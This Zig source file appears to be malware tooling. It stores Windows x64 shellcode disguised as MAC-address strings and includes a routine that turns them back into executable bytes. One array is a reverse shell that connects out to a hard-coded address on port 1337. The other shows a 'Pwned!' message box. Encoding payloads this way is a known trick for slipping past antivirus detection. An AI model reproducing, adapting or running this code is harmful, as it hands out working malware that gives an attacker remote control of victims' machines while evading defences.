const std = @import("std");

pub const revshell: [85][]const u8 = [_][]const u8{ "fc:48:83:e4:f0:e8", "cc:00:00:00:41:51", "41:50:52:48:31:d2", "51:56:65:48:8b:52", "60:48:8b:52:18:48", "8b:52:20:48:0f:b7", "4a:4a:4d:31:c9:48", "8b:72:50:48:31:c0", "ac:3c:61:7c:02:2c", "20:41:c1:c9:0d:41", "01:c1:e2:ed:52:41", "51:48:8b:52:20:8b", "42:3c:48:01:d0:66", "81:78:18:0b:02:0f", "85:72:00:00:00:8b", "80:88:00:00:00:48", "85:c0:74:67:48:01", "d0:8b:48:18:44:8b", "40:20:50:49:01:d0", "e3:56:4d:31:c9:48", "ff:c9:41:8b:34:88", "48:01:d6:48:31:c0", "41:c1:c9:0d:ac:41", "01:c1:38:e0:75:f1", "4c:03:4c:24:08:45", "39:d1:75:d8:58:44", "8b:40:24:49:01:d0", "66:41:8b:0c:48:44", "8b:40:1c:49:01:d0", "41:8b:04:88:48:01", "d0:41:58:41:58:5e", "59:5a:41:58:41:59", "41:5a:48:83:ec:20", "41:52:ff:e0:58:41", "59:5a:48:8b:12:e9", "4b:ff:ff:ff:5d:49", "be:77:73:32:5f:33", "32:00:00:41:56:49", "89:e6:48:81:ec:a0", "01:00:00:49:89:e5", "49:bc:02:00:05:39", "64:56:41:1d:41:54", "49:89:e4:4c:89:f1", "41:ba:4c:77:26:07", "ff:d5:4c:89:ea:68", "01:01:00:00:59:41", "ba:29:80:6b:00:ff", "d5:6a:0a:41:5e:50", "50:4d:31:c9:4d:31", "c0:48:ff:c0:48:89", "c2:48:ff:c0:48:89", "c1:41:ba:ea:0f:df", "e0:ff:d5:48:89:c7", "6a:10:41:58:4c:89", "e2:48:89:f9:41:ba", "99:a5:74:61:ff:d5", "85:c0:74:0a:49:ff", "ce:75:e5:e8:93:00", "00:00:48:83:ec:10", "48:89:e2:4d:31:c9", "6a:04:41:58:48:89", "f9:41:ba:02:d9:c8", "5f:ff:d5:83:f8:00", "7e:55:48:83:c4:20", "5e:89:f6:6a:40:41", "59:68:00:10:00:00", "41:58:48:89:f2:48", "31:c9:41:ba:58:a4", "53:e5:ff:d5:48:89", "c3:49:89:c7:4d:31", "c9:49:89:f0:48:89", "da:48:89:f9:41:ba", "02:d9:c8:5f:ff:d5", "83:f8:00:7d:28:58", "41:57:59:68:00:40", "00:00:41:58:6a:00", "5a:41:ba:0b:2f:0f", "30:ff:d5:57:59:41", "ba:75:6e:4d:61:ff", "d5:49:ff:ce:e9:3c", "ff:ff:ff:48:01:c3", "48:29:c6:48:85:f6", "75:b4:41:ff:e7:58", "6a:00:59:49:c7:c2", "f0:b5:a2:56:ff:d5" };
pub const msgbox: [51][]const u8 = [_][]const u8{ "fc:48:81:e4:f0:ff", "ff:ff:e8:d0:00:00", "00:41:51:41:50:52", "51:56:48:31:d2:65", "48:8b:52:60:3e:48", "8b:52:18:3e:48:8b", "52:20:3e:48:8b:72", "50:3e:48:0f:b7:4a", "4a:4d:31:c9:48:31", "c0:ac:3c:61:7c:02", "2c:20:41:c1:c9:0d", "41:01:c1:e2:ed:52", "41:51:3e:48:8b:52", "20:3e:8b:42:3c:48", "01:d0:3e:8b:80:88", "00:00:00:48:85:c0", "74:6f:48:01:d0:50", "3e:8b:48:18:3e:44", "8b:40:20:49:01:d0", "e3:5c:48:ff:c9:3e", "41:8b:34:88:48:01", "d6:4d:31:c9:48:31", "c0:ac:41:c1:c9:0d", "41:01:c1:38:e0:75", "f1:3e:4c:03:4c:24", "08:45:39:d1:75:d6", "58:3e:44:8b:40:24", "49:01:d0:66:3e:41", "8b:0c:48:3e:44:8b", "40:1c:49:01:d0:3e", "41:8b:04:88:48:01", "d0:41:58:41:58:5e", "59:5a:41:58:41:59", "41:5a:48:83:ec:20", "41:52:ff:e0:58:41", "59:5a:3e:48:8b:12", "e9:49:ff:ff:ff:5d", "3e:48:8d:8d:1a:01", "00:00:41:ba:4c:77", "26:07:ff:d5:49:c7", "c1:00:00:00:00:3e", "48:8d:95:0e:01:00", "00:3e:4c:8d:85:13", "01:00:00:48:31:c9", "41:ba:45:83:56:07", "ff:d5:48:31:c9:41", "ba:f0:b5:a2:56:ff", "d5:54:61:6f:21:00", "50:77:6e:65:64:21", "00:75:73:65:72:33", "32:2e:64:6c:6c:00" };

pub fn macDeobfuscation(mac_array: []const []const u8, allocator: std.mem.Allocator) ![]u8 {
    var buffer = try allocator.alloc(u8, mac_array.len * 6);
    var offset: usize = 0;

    for (mac_array) |mac| {
        var parts = std.mem.splitScalar(u8, mac, ':');
        var i: usize = 0;
        while (parts.next()) |part| : (i += 1) {
            if (i >= 6) return error.InvalidMacFormat;
            buffer[offset + i] = std.fmt.parseInt(u8, part, 16) catch return error.InvalidHexDigit;
        }
        if (i != 6) return error.InvalidMacFormat;
        offset += 6;
    }

    return buffer;
}
